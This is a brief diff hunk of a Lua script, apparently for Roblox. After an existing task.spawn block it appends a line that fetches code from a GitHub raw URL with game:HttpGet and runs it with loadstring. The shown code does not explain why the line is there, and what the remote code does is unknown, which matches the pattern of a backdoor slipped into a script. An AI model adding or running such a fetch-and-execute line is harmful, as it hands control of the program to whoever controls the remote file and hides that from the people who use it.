@@ -145,3 +145,4 @@ task.spawn(function()
         end
     end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/1/main/bot'))()
